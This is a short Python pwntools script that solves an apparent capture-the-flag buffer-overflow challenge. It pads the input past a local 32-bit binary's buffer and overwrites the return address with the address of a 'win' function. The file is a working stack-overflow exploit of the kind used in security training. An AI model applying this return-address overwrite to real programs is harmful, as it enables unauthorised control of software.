#! /usr/bin/env python
from pwn import *
context.clear(arch='i386', os='linux', endian='little', word_size=32)

class RemoteData:
    name    = '/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/vuln'
    elf     = ELF(name)
    # Addresses
    win_address     = elf.symbols['win']
    #
    offset_buf_to_eip = 0x28 + 4


def main():
    # open process
    p = process(RemoteData.name)

    # Stage 1
    payload = 'A'*RemoteData.offset_buf_to_eip
    payload += p32(RemoteData.win_address)

    p.clean()
    p.sendline(payload)

    print(p.recvall())


if __name__ == "__main__":
    main()
